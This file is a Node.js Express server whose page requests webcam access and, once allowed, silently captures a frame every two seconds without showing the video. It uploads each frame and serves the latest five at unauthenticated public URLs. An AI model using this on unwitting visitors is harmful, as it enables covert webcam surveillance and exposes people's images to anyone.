const express = require('express');
const app = express();
const http = require('http').Server(app);
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

// Middleware
app.use(bodyParser.json({ limit: '10mb' }));
app.use('/img', express.static(path.join(__dirname, 'uploads')));

// Store image files
const imagesDir = path.join(__dirname, 'uploads');

// Serve HTML with automatic camera access and image capture
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Automatic Image Capture</title>
        </head>
        <body>
            <h1>Automatic Image Capture</h1>
            <script>
                async function start() {
                    try {
                        // Request camera access
                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();

                        // Capture image every 2 seconds
                        setInterval(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const dataUrl = canvas.toDataURL('image/png');

                            // Send image to server
                            fetch('/upload', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ image: dataUrl })
                            })
                            .then(response => response.json())
                            .then(data => console.log('Image URL:', data.url))
                            .catch(error => console.error('Error:', error));
                        }, 2000); // Every 2 seconds
                    } catch (err) {
                        console.error('Error accessing camera:', err);
                    }
                }

                start();
            </script>
        </body>
        </html>
    `);
});

// Endpoint to handle image upload
app.post('/upload', (req, res) => {
    const { image } = req.body;
    if (image) {
        const base64Data = image.replace(/^data:image\/png;base64,/, '');
        const filePath = path.join(imagesDir, `${Date.now()}.png`);
        fs.writeFile(filePath, base64Data, 'base64', (err) => {
            if (err) {
                return res.status(500).json({ error: 'Failed to save image' });
            }
            updateImageList();
            const url = `${req.protocol}://${req.get('host')}/img/${path.basename(filePath)}`;
            res.json({ url });
        });
    } else {
        res.status(400).json({ error: 'No image data' });
    }
});

// Endpoint to list all uploaded images (only the latest 5)
app.get('/images', (req, res) => {
    fs.readdir(imagesDir, (err, files) => {
        if (err) {
            return res.status(500).json({ error: 'Failed to read directory' });
        }
        files = files.sort((a, b) => b.localeCompare(a)); // Sort files by name in descending order (newest first)
        const latestFiles = files.slice(0, 5); // Get only the latest 5 files
        const baseUrl = `${req.protocol}://${req.get('host')}/img/`;
        const imageUrls = latestFiles.map(file => `${baseUrl}${file}`);
        res.json({ images: imageUrls });
    });
});

// Function to update the image list by keeping only the latest 5 images
function updateImageList() {
    fs.readdir(imagesDir, (err, files) => {
        if (err) {
            console.error('Failed to read directory:', err);
            return;
        }
        files.sort((a, b) => b.localeCompare(a)); // Sort files by name in descending order
        const filesToDelete = files.slice(5); // Files to delete (older than the latest 5)
        filesToDelete.forEach(file => {
            fs.unlink(path.join(imagesDir, file), err => {
                if (err) {
                    console.error('Failed to delete file:', file, err);
                }
            });
        });
    });
}

// Create 'uploads' directory if it doesn't exist
if (!fs.existsSync(imagesDir)) {
    fs.mkdirSync(imagesDir);
}

// Start the server
http.listen(process.env.PORT || 3000, () => {
    console.log('Server listening on port 3000');
});
